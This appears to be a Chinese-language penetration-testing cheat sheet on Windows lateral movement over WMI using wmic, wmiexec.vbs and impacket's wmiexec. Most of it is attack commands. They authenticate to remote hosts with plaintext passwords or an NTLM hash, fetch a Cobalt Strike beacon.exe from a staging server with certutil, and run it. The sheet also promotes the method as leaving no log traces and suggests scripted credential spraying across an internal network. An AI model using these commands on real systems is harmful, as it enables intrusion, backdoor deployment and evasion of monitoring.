WMI (Windows Management Instrumentation)是Windows管理规范，一种用于管理和监控Windows系统的技术。
是通过 135 端口进行利用，支持用户名明文或者 hash 的方式进行认证。
并且该方法不会在目标日志系统留下痕迹。psexec 会记录大量日志，wmic 不会记录下日志。wmic 更为隐蔽。


## **1.wmic**
内置win自带，单执行，CS可用。
```
wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 
process call create "cmd.exe /c certutil -urlcache -split -f 
http://192.168.3.31/beacon.exe c:/beacon.exe"

wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 
process call create "cmd.exe c:/beacon.exe"
```





## **2.cscript**
内置，交互式可以反弹shell，但CS不支持会卡死。
需上传 wmiexec.vbs
cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator 
Admin12345

## **3.impacket套件wmiexec程序脚本 支持hash**
支持hash
可交互式反弹shell
可单执行命令
使用profier代理转发socks代理到本地运行程序或脚本。
```
wmiexec ./administrator:admin!@#45@192.168.3.32 "whoami"

wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.
3.32 "whoami"

将后门beacon.exe上传到跳板机80端口根目录。

下载后门：
wmiexec ./administrator:admin!@#45@192.168.3.32 "cmd.exe /c 
certutil -urlcache -split -f http://192.168.3.31/beacon.exe 
c:/beacon.exe"

执行后门：
wmiexec ./administrator:admin!@#45@192.168.3.32 "cmd.exe /c 
c:/beacon.exe"
```
可以写一个脚本，把内网ip，已有的用户名，明文密码，密码hash导入，批量反向上线。\
实现喷洒。

